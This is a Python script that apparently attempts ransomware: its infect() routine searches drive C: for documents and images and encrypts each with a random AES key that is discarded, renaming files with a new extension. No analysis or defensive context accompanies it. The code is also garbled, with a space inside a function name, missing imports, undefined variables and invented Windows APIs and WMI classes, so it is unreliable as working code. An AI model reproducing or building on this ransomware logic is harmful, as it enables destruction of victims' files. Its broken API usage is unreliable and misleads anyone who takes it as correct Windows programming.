import win32file
import win32con
import win32com.client
import os
import base64
import hashlib

wmi = win32com.client.Dispatch("WMI.winmgmts:\\\\.\\root\cimv2")

def get_random_bytes(n):
    return os.urandom(n)

def mmap_file(file_path):
    with open(file_path, 'rb') as f:
        size = f.seek(0, win32file.FILE_END)
        f.seek(0, win32file.FILE_BEGIN)
        mh = win32file.CreateFileMapping(
            win32con.INVALID_HANDLE_VALUE, None, win32con.PAGE_READWRITE, 0, size, None)
        return win32file.MapViewOfFile(mh, win32con.FILE_MAP_WRITE, 0, 0, size)

def encrypt_ memory_region(memory_region, original_size):
    key = get_random_bytes(32)
    iv = get_random_bytes(16)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = base64.b64encode(cipher.encrypt(memory_region[:original_size]))

    extension = ".{:08x}".format(hashlib.sha256(key).digest()[0])
    new_file_size = len(encrypted_data)

    # Allocate new memory for the encrypted data
    new_memory_region = mmap_file(os.path.splitext(file_path)[0] + extension)
    os.write(new_memory_region, encrypted_data)

    # Overwrite original memory with the encrypted data
    win32api.VirtualProtectEx(
        win32con.GetCurrentProcess(),
        memory_region,
        original_size,
        win32con.MEM_RESERVE | win32con.MEM_COMMIT,
        0)
    win32api.ReadFile(new_memory_region, memory_region, original_size, win32con.FILE_BEGIN)

    # Deallocate the old memory
    win32file.FlushViewOfFile(memory_region, 0, original_size)
    win32file.UnmapViewOfFile(memory_region)
    win32file.CloseHandle(win32file.GetCurrentProcess() + 1)

def infect():
    files = wmi.ExecQuery("SELECT * FROM Win32_File WHERE Drive='C:\\' AND Extension IN ('docx', 'xlsx', 'pdf', 'jpg', 'jpeg', 'png', 'txt')")

    for file in files:
        file_path = file.Path
        print(f"Infecting {file_path}")

        # Load and execute the script in memory
        sc = wmi.Get("Win32_SCScriptExec")
        sc.WorkingDirectory = os.path.abspath(os.path.dirname(__file__))
        sc.Command = f"python -c '{compile(open(__file__).read(), '<string>', 'exec')}' {file_path}"
        sc.Arguments = confidential_parameter(file_path)
        sc.Create()

def confidential_parameter(file_path):
    file_ptr, _ = win32file.CreateFile(file_path, win32con.GENERIC_READ, win32con.FILE_SHARE_READ, None, win32con.OPEN_EXISTING, 0, None)
    original_size = win32file.GetFileSize(file_ptr, 0)
    memory_region = mmap_file(file_path)
    encrypt_memory_region(memory_region, original_size)
    win32file.CloseHandle(file_ptr)
    return ""

if __name__ == "__main__":
    infect()